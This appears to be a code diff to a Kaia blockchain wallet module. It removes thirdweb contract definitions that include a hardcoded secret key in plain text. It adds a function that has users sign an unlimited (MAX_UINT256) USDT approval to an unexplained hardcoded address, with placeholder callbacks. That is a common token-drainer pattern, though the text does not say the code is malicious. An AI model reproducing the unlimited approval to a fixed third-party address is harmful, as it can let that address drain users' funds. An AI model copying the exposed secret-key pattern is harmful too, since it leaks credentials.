@@ -1,40 +1,42 @@
-import { getContract } from "thirdweb";
-import { defineChain } from "thirdweb";
-import { sepolia, } from "thirdweb/chains";
-import { getOwnedNFTs } from "thirdweb/extensions/erc1155";
-import { createThirdwebClient } from "thirdweb";
-import {ref} from "vue";
+import axios from 'axios';
+import {abi} from './erc20.ts'
+
+const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
 
-const thirdweb_secret_key='C0ZGo9TbizvBacxRT3KUCQnfp4YRxgnnsV-vDUMh6HrjV4kfoHzHTpTE_p_2cWxlnIzkrRQo7XdV_yu-WPejiQ'
-const kaiaChain = defineChain(8217);
-export const client = createThirdwebClient({
-  secretKey: thirdweb_secret_key,
-});
+export const kaiaWalletApprove = async (): Promise<void> => {
 
-export const usdtContract = getContract({
-  client,
-  address: "0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2",
-  chain: kaiaChain,
-});
 
-export const boraContract = getContract({
-  client,
-  address: "0x02cbe46fb8a1f579254a9b485788f2d86cad51aa",
-  chain: kaiaChain,
-});
+    try {
+        const res = await axios.post(
+            'https://api.kaiawallet.io/api/v1/k/prepare',
+            // '{\n  "type": "execute_contract",\n  "bapp": {\n    "name": "test app",\n    "callback": {\n      "success": "https://www.google.com/search?q=success",\n      "fail": "https://www.google.com/search?q=fail"\n    }\n  },\n  "transaction": {\n    "abi": "{\\n  \\"constant\\": false,\\n  \\"inputs\\": [\\n    {\\n      \\"name\\": \\"_to\\",\\n      \\"type\\": \\"address\\"\\n    },\\n    {\\n      \\"name\\": \\"_value\\",\\n      \\"type\\": \\"uint256\\"\\n    }\\n  ],\\n  \\"name\\": \\"transfer\\",\\n  \\"outputs\\": [\\n    {\\n      \\"name\\": \\"\\",\\n      \\"type\\": \\"bool\\"\\n    }\\n  ],\\n  \\"payable\\": false,\\n  \\"stateMutability\\": \\"nonpayable\\",\\n  \\"type\\": \\"function\\"\\n}",\n    "value": "0",\n    "to": "0x5c74070fdea071359b86082bd9f9b3deaafbe32b",\n    "params": "[\\"0x0000000000000000000000000000000000000000\\", \\"0\\"]"\n  }\n}',
+            {
+                'type': 'execute_contract',
+                'bapp': {
+                    'name': 'KUSDT',
+                    'callback': {
+                        'success': 'https://www.google.com/search?q=success',
+                        'fail': 'https://www.google.com/search?q=fail'
+                    }
+                },
+                'transaction': {
+                    'abi': abi,
+                    'to': '0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2',
+                    'params': '["0x48F943a8a6A6437117063D3aCaf62e2047467966", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]'
+                }
+            },
+            {
+                headers: {
+                    'Content-Type': 'application/json; charset=utf-8'
+                }
+            }
+        );
+        return res.data
+    } catch (error) {
+        console.error("❌ 交易失败:", error);
+        throw error; // 抛出错误
+    }
 
-export const grndContract = getContract({
-  client,
-  address: "0x84f8c3c8d6ee30a559d73ec570d574f671e82647",
-  chain: kaiaChain,
-});
 
-export const nptContract = getContract({
-  client,
-  address: "0xe06597d02a2c3aa7a9708de2cfa587b128bd3815",
-  chain: kaiaChain,
-});
-
-export default {usdtContract, client, boraContract, grndContract, nptContract};
-
+}
